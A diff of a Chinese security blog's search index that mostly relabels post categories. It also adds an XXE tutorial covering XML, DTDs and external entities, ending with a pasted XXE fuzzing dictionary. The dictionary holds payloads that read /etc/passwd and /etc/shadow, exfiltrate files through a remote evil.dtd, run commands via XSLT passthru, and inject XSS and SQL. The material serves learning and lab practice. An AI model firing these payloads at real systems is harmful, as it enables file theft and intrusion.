@@ -15,12 +15,10 @@
 <p>如果网页A对token的验证机制不完善 并且储存在了包文中 那么通过拦包的方式就可以拦截这串Token值 从而冒充了用户的身份</p>
 ]]></content>
       <categories>
-        <category>分类1</category>
-        <category>分类2</category>
+        <category>web漏洞</category>
       </categories>
       <tags>
-        <tag>标签1</tag>
-        <tag>标签2</tag>
+        <tag>CSRF</tag>
       </tags>
   </entry>
   <entry>
@@ -72,7 +70,7 @@
 <p> 这道题主要考的python的代码审计 好像和ssrf没什么关系？？？ 也是第一次做python的题 路还长继续加油吧！</p>
 ]]></content>
       <categories>
-        <category>网安</category>
+        <category>web漏洞</category>
       </categories>
       <tags>
         <tag>python</tag>
@@ -146,7 +144,7 @@
 <p>这里回显输出成功 只需要把恶意so的c文件换成system(“cat /flag”);就可以了 如果出现了连接超时 说明脏字符少了 并且content-length不匹配 最好调到15000左右 然后多加一些脏字符就可以了</p>
 ]]></content>
       <categories>
-        <category>网安</category>
+        <category>web漏洞</category>
       </categories>
       <tags>
         <tag>Goahead</tag>
@@ -189,7 +187,7 @@
 
 ]]></content>
       <categories>
-        <category>web</category>
+        <category>web漏洞</category>
       </categories>
       <tags>
         <tag>JWT</tag>
@@ -279,7 +277,7 @@
 
 ]]></content>
       <categories>
-        <category>网安</category>
+        <category>Linux漏洞</category>
       </categories>
       <tags>
         <tag>Linux提权</tag>
@@ -343,8 +341,8 @@
 <p>但是如果你在一方监听端口的情况下对这个文件进行读写，就能实现与监听端口的服务器的socket通信</p>
 ]]></content>
       <categories>
-        <category>web</category>
-        <category>网安</category>
+        <category>web漏洞</category>
+        <category>Linux漏洞</category>
       </categories>
       <tags>
         <tag>Linux重定向</tag>
@@ -389,12 +387,10 @@
 <p><a href="https://www.freebuf.com/news/193447.html">Burpsuite Collaborato模块详解 - FreeBuf网络安全行业门户</a></p>
 ]]></content>
       <categories>
-        <category>网安</category>
-        <category>web</category>
+        <category>web漏洞</category>
       </categories>
       <tags>
-        <tag>php</tag>
-        <tag>SSRF服务端请求伪造</tag>
+        <tag>SSRF</tag>
       </tags>
   </entry>
   <entry>
@@ -443,10 +439,68 @@
 <p><a href="https://www.runoob.com/jsref/dom-obj-event.html">HTML DOM 事件对象 | 菜鸟教程 (runoob.com)</a></p>
 ]]></content>
       <categories>
-        <category>网安</category>
+        <category>web漏洞</category>
       </categories>
       <tags>
         <tag>XSS</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>XXE</title>
+    <url>/2022/08/11/XXE/</url>
+    <content><![CDATA[<h1 id="XXE（XML外部实体注入攻击）"><a href="#XXE（XML外部实体注入攻击）" class="headerlink" title="XXE（XML外部实体注入攻击）"></a>XXE（XML外部实体注入攻击）</h1><h2 id="什么是XML"><a href="#什么是XML" class="headerlink" title="什么是XML"></a>什么是XML</h2><p>在前端三大件中 我们知道由html构成了网站的骨架 并且如果我们在后端写的代码在前端页面上有回显 这里也是html将数据显示到了前端上 因此我们可以说html的作用是显示数据</p>
+<p>xml的格式与html基本一样 也是由一对标签进行闭合 但xml的作用是用来储存数据 而并不是显示数据 并且xml标签需要自己来命名 这里举个例子 用xml来储存一段信息</p>
+<figure class="highlight xml"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;ISO-8859-1&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>xml的文档第一行声明了xml所使用的版本 以及编码格式等信息 下面则使用各种自定义标签来储存信息 也正是因为标签可以自定义 xml文档可以让我们更好的理解 上述xml文档中 <code>&lt;note&gt; &lt;/note&gt;</code>是根元素 其中定义了各种子元素 每一个xml文档都必须有一个根元素</p>
+<p>我们知道由于html语法的随意性 即使出现各种错误语法不同的浏览器也会为其配置相应的处理方法 但在xml中标签必须闭合</p>
+<p>其余xml的知识移步w3school学习</p>
+<p><a href="https://www.w3schools.cn/xml/default.asp">XML 教程 (w3schools.cn)</a></p>
+<h2 id="XML-DTD"><a href="#XML-DTD" class="headerlink" title="XML DTD"></a>XML DTD</h2><h3 id="DTD文件的格式"><a href="#DTD文件的格式" class="headerlink" title="DTD文件的格式"></a>DTD文件的格式</h3><p>xml DTD定义了xml文档的结构 对上面的xml文档定义一个DTD</p>
+<figure class="highlight plaintext"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE note</span><br><span class="line">[</span><br><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>&lt;!DOCTYPE XXX[]&gt;</code>是一个dtd文件的固定格式 其中xxx我们可以自己命名</p>
+<p>第三行声明了根元素<code>&lt;note&gt;</code>中包含了四个子元素 4-7行分别声明了这四个子元素中的数据类型 PCDATA是什么意思我们下面说</p>
+<h3 id="XML实体引用"><a href="#XML实体引用" class="headerlink" title="XML实体引用"></a>XML实体引用</h3><p>在xml中 如果我们要使用<code>&lt; &gt; &#39; &quot; &amp;</code>这几个字符 由于这几个字符有特殊含义 因此我们要对其进行实体引用 </p>
+<p><img src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202208091631695.png" alt="image-20220809163109644"></p>
+<p>上面这些是xml中提供的实体引用 我们也可以自己定义实体引用 </p>
+<p> 一般实体的声明：<code>&lt;!ENTITY 实体名称 &quot;实体内容&quot;&gt;</code></p>
+<p>　　　引用一般实体的方法：<code>&amp;实体名称;</code></p>
+<figure class="highlight xml"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">nbsp</span> <span class="string">&quot;&amp;#xA0;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">writer</span> <span class="string">&quot;Writer: Donald Duck.&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">copyright</span> <span class="string">&quot;Copyright: W3Schools.&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>Tove<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>Jani<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget me this weekend!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">footer</span>&gt;</span><span class="symbol">&amp;writer;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;copyright;</span><span class="tag">&lt;/<span class="name">footer</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202208091635692.png" alt="image-20220809163545661"></p>
+<p>可以看到我们在DTD中定义了三个实体 在xml文档中我们可以用&amp;调用这些实体 但是如果我们这么写</p>
+<figure class="highlight xml"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">nbsp</span> <span class="string">&quot;&amp;#xA0;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">writer</span> <span class="string">&quot;Writer: Donald Duck.&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">copyright</span> <span class="string">&quot;Copyright: W3Schools.&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>Tove<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>Jani<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget me this weekend!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">footer</span>&gt;</span>&lt;![CDATA[&quot;&amp;writer;&amp;nbsp;&amp;copyright;&quot;]]&gt;<span class="tag">&lt;/<span class="name">footer</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202208091645937.png" alt="image-20220809164515896"></p>
+<p>可以发现这些实体并没有引用 可以发现因为我们加了CDATA导致了里面的内容被当作纯文本显示出来 那么什么是CDATA呢</p>
+<p>我们刚才在DTD中提到了PCDATA 可以发现多了一个P P的意思就是parse 即为可解析 也就是说这一元素是可以被xml解析的</p>
+<p>所以CDATA 就是不可被解析的内容 这里要注意PCDATA只能在DTD中进行定义 CDATA只能在xml文档中进行定义</p>
+<h2 id="XML外部实体引用"><a href="#XML外部实体引用" class="headerlink" title="XML外部实体引用"></a>XML外部实体引用</h2><p>刚才我们提到了怎么在DTD中声明实体并在xml中引用 我们也可以使用关键字SYSTEM并用实体来引入外部DTD文件</p>
+<figure class="highlight xml"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE 根元素 <span class="keyword">SYSTEM</span> <span class="string">&quot;文件名&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>比如</p>
+<figure class="highlight plaintext"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY xxe SYSTEM &quot;http://otherhost/xxxx.dtd&quot; &gt;]&gt;     &lt;!--- 远程包含 ---!&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///c://test/1.txt&quot; &gt;]&gt;        &lt;!--- 本地包含 ---!&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这样就可以达到ssrf的效果了</p>
+<p>当然ENTITY也是一个DTD 那么我们也可以在ENTITY当中去包含其他的ENTITY 比如</p>
+<figure class="highlight plaintext"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % ent &quot;&lt;!ENTITY data SYSTEM &#x27;:%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>最终执行<code>&amp;ent &amp;data </code>即可读取passwd‘</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>XXE复现起来比较简单 vulhub上有一个<code>CVE-2017-12629-RCE-solr:XXE</code> 其他的可以在bursuite的靶场去复现 方式都是一样的 都是去包含自己ip下的恶意dtd文件 我就不作复现了 有兴趣的师傅可以自己去复现一下</p>
+<p><a href="https://portswigger.net/web-security/all-labs#xml-external-entity-xxe-injection">All labs | Web Security Academy (portswigger.net)</a></p>
+<p>顺便留一个github上开源的xxe字典</p>
+<figure class="highlight plaintext"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE xxe [&lt;!ENTITY foo &quot;aaaaaa&quot;&gt;]&gt;</span><br><span class="line">&lt;!DOCTYPE xxe [&lt;!ENTITY foo &quot;aaaaaa&quot;&gt;]&gt;&lt;root&gt;&amp;foo;&lt;/root&gt;</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE xxe [&lt;!ENTITY foo &quot;aaaaaa&quot;&gt;]&gt;</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE xxe [&lt;!ENTITY foo &quot;aaaaaa&quot;&gt;]&gt;&lt;root&gt;&amp;foo;&lt;/root&gt;</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;test&gt;&lt;/test&gt;</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;file:///etc/issue&quot; &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;file:///etc/issue&quot; &gt;]&gt;</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;file:///etc/shadow&quot; &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;file:///etc/shadow&quot; &gt;]&gt;</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;file:///c:/boot.ini&quot; &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;file:///c:/boot.ini&quot; &gt;]&gt;</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;http://example.com:80&quot; &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;http://example:443&quot; &gt;]&gt;</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY&gt;&lt;!ENTITY xxe SYSTEM &quot;file:////dev/random&quot;&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span><br><span class="line">&lt;test&gt;&lt;/test&gt;</span><br><span class="line">&lt;![CDATA[&lt;test&gt;&lt;/test&gt;]]&gt;</span><br><span class="line">&amp;foo;</span><br><span class="line">%foo;</span><br><span class="line">count(/child::node())</span><br><span class="line">x&#x27; or name()=&#x27;username&#x27; or &#x27;x&#x27;=&#x27;y</span><br><span class="line">&lt;name&gt;&#x27;,&#x27;&#x27;)); phpinfo(); exit;/*&lt;/name&gt;</span><br><span class="line">&lt;![CDATA[&lt;script&gt;var n=0;while(true)&#123;n++;&#125;&lt;/script&gt;]]&gt;</span><br><span class="line">&lt;![CDATA[&lt;]]&gt;SCRIPT&lt;![CDATA[&gt;]]&gt;alert(&#x27;XSS&#x27;);&lt;![CDATA[&lt;]]&gt;/SCRIPT&lt;![CDATA[&gt;]]&gt;</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;foo&gt;&lt;![CDATA[&lt;]]&gt;SCRIPT&lt;![CDATA[&gt;]]&gt;alert(&#x27;XSS&#x27;);&lt;![CDATA[&lt;]]&gt;/SCRIPT&lt;![CDATA[&gt;]]&gt;&lt;/foo&gt;</span><br><span class="line">&lt;foo&gt;&lt;![CDATA[&lt;]]&gt;SCRIPT&lt;![CDATA[&gt;]]&gt;alert(&#x27;XSS&#x27;);&lt;![CDATA[&lt;]]&gt;/SCRIPT&lt;![CDATA[&gt;]]&gt;&lt;/foo&gt;</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;foo&gt;&lt;![CDATA[&#x27; or 1=1 or &#x27;&#x27;=&#x27;]]&gt;&lt;/foo&gt;</span><br><span class="line">&lt;foo&gt;&lt;![CDATA[&#x27; or 1=1 or &#x27;&#x27;=&#x27;]]&gt;&lt;/foo&gt;</span><br><span class="line">&lt;xml ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;![CDATA[&lt;IMG SRC=&quot;javas]]&gt;&lt;![CDATA[cript:alert(&#x27;XSS&#x27;);&quot;&gt;]]&gt;</span><br><span class="line">&lt;xml ID=&quot;xss&quot;&gt;&lt;I&gt;&lt;B&gt;&amp;lt;IMG SRC=&quot;javas&lt;!-- --&gt;cript:alert(&#x27;XSS&#x27;)&quot;&amp;gt;&lt;/B&gt;&lt;/I&gt;&lt;/xml&gt;&lt;SPAN DATASRC=&quot;#xss&quot; DATAFLD=&quot;B&quot; DATAFORMATAS=&quot;HTML&quot;&gt;&lt;/SPAN&gt;&lt;/C&gt;&lt;/X&gt;&lt;/xml&gt;&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;</span><br><span class="line">&lt;xml SRC=&quot;xsstest.xml&quot; ID=I&gt;&lt;/xml&gt;&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;</span><br><span class="line">&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;</span><br><span class="line">&lt;xml SRC=&quot;xsstest.xml&quot; ID=I&gt;&lt;/xml&gt;</span><br><span class="line">&lt;HTML xmlns:xss&gt;&lt;?import namespace=&quot;xss&quot; implementation=&quot;http://ha.ckers.org/xss.htc&quot;&gt;&lt;xss:xss&gt;XSS&lt;/xss:xss&gt;&lt;/HTML&gt;</span><br><span class="line">&lt;HTML xmlns:xss&gt;&lt;?import namespace=&quot;xss&quot; implementation=&quot;http://ha.ckers.org/xss.htc&quot;&gt;</span><br><span class="line">&lt;xsl:stylesheet version=&quot;1.0&quot; xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot; xmlns:php=&quot;http://php.net/xsl&quot;&gt;&lt;xsl:template match=&quot;/&quot;&gt;&lt;script&gt;alert(123)&lt;/script&gt;&lt;/xsl:template&gt;&lt;/xsl:stylesheet&gt;</span><br><span class="line">&lt;xsl:stylesheet version=&quot;1.0&quot; xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot; xmlns:php=&quot;http://php.net/xsl&quot;&gt;&lt;xsl:template match=&quot;/&quot;&gt;&lt;xsl:copy-of select=&quot;document(&#x27;/etc/passwd&#x27;)&quot;/&gt;&lt;/xsl:template&gt;&lt;/xsl:stylesheet&gt;</span><br><span class="line">&lt;xsl:stylesheet version=&quot;1.0&quot; xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot; xmlns:php=&quot;http://php.net/xsl&quot;&gt;&lt;xsl:template match=&quot;/&quot;&gt;&lt;xsl:value-of select=&quot;php:function(&#x27;passthru&#x27;,&#x27;ls -la&#x27;)&quot;/&gt;&lt;/xsl:template&gt;&lt;/xsl:stylesheet&gt;</span><br><span class="line">&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;</span><br><span class="line">&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;file:///etc/shadow&quot; &gt;]&gt;</span><br><span class="line">&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;file:///c:/boot.ini&quot; &gt;]&gt;</span><br><span class="line">&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;http://example.com/text.txt&quot; &gt;]&gt;</span><br><span class="line">&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY&gt;&lt;!ENTITY xxe SYSTEM &quot;file:////dev/random&quot;&gt;]&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; trick SYSTEM &#x27;http://127.0.0.1:80/?%file;&#x27;&gt;  &quot;&gt; %int;</span><br><span class="line">&lt;!DOCTYPE xxe [ &lt;!ENTITY % file SYSTEM &quot;file:///etc/issue&quot;&gt;&lt;!ENTITY % dtd SYSTEM &quot;http://example.com/evil.dtd&quot;&gt;%dtd;%trick;]&gt;</span><br><span class="line">&lt;!DOCTYPE xxe [ &lt;!ENTITY % file SYSTEM &quot;file:///c:/boot.ini&quot;&gt;&lt;!ENTITY % dtd SYSTEM &quot;http://example.com/evil.dtd&quot;&gt;%dtd;%trick;]&gt;</span><br></pre></td></tr></table></figure>
+
+
+]]></content>
+      <categories>
+        <category>web漏洞</category>
+      </categories>
+      <tags>
+        <tag>XXE</tag>
       </tags>
   </entry>
   <entry>
@@ -600,11 +654,9 @@
 
 ]]></content>
       <categories>
-        <category>Web</category>
-        <category>网安</category>
+        <category>web漏洞</category>
       </categories>
       <tags>
-        <tag>标签2</tag>
         <tag>php</tag>
       </tags>
   </entry>
@@ -675,7 +727,7 @@
 <p>（2）由于FastCGI是多进程，所以比CGI多线程消耗更多的服务器内存，php-cgi解释器每进程消耗7至25兆内存，将这个数字乘以50或100就是很大的内存数。<br>再放一个p牛的利用fpm的一个漏洞<br><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">Fastcgi协议分析 &amp;&amp; PHP-FPM未授权访问漏洞 &amp;&amp; Exp编写 | 离别歌 (leavesongs.com)</a></p>
 ]]></content>
       <categories>
-        <category>web</category>
+        <category>web漏洞</category>
       </categories>
       <tags>
         <tag>php</tag>
@@ -710,12 +762,11 @@
 <p><strong>详细例子移步<a href="https://www.cnblogs.com/pursue-security/p/15406272.html#_label1_1">RCE篇之无参数rce - 学安全的小白 - 博客园 (cnblogs.com)</a></strong></p>
 ]]></content>
       <categories>
-        <category>Web</category>
+        <category>web漏洞</category>
         <category>php</category>
       </categories>
       <tags>
-        <tag>标签2</tag>
-        <tag>RCE</tag>
+        <tag>无参RCE</tag>
       </tags>
   </entry>
   <entry>
@@ -764,7 +815,7 @@
 <p><a href="https://y1zh3e7.github.io/2022/04/24/%E8%93%9D%E5%B8%BD%E6%9D%AF-2021-One-Pointer-PHP/">蓝帽杯 2021 One Pointer PHP - y1zh3e7</a></p>
 ]]></content>
       <categories>
-        <category>网安</category>
+        <category>web漏洞</category>
       </categories>
       <tags>
         <tag>LD_PRELOAD</tag>
@@ -891,10 +942,11 @@
 <p><a href="https://xz.aliyun.com/t/6113#toc-4">https://xz.aliyun.com/t/6113#toc-4</a></p>
 ]]></content>
       <categories>
-        <category>网安</category>
+        <category>web漏洞</category>
       </categories>
       <tags>
         <tag>原型链污染</tag>
+        <tag>Nodejs</tag>
       </tags>
   </entry>
   <entry>
@@ -1006,11 +1058,11 @@
 <p>可以看到php命令有权限 php-a 进入php交互模式并用刚才绕过openbasedir的payload再执行一次 最后读取flag</p>
 ]]></content>
       <categories>
-        <category>web</category>
-        <category>CTF</category>
+        <category>web漏洞</category>
       </categories>
       <tags>
-        <tag>buu</tag>
+        <tag>fastcgi</tag>
+        <tag>disable_function</tag>
       </tags>
   </entry>
 </search>
